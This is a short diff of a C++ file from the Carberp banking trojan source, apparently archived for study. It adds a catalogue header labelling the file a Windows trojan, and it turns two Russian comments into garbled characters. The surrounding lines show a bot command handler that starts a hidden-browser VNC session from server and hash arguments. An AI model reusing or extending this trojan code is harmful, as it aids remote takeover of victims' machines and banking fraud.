@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "RuBnk.h"
 #include "GetApi.h"
 
@@ -113,10 +124,10 @@ bool ExecuteIblock_processblock(LPVOID Manager, PCHAR Command, PCHAR Args)
 	
 	PCHAR PArgs=Args;
 	
-	// Запуск потока скрытого браузера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PVNC1 V1 = CreateStruct(VNC1);
 
-	// Парсим аргументы
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	V1->Server	= STR::GetLeftStr(PArgs, " ");
 	V1->Hach	= STR::GetRightStr(PArgs, " ");
 	
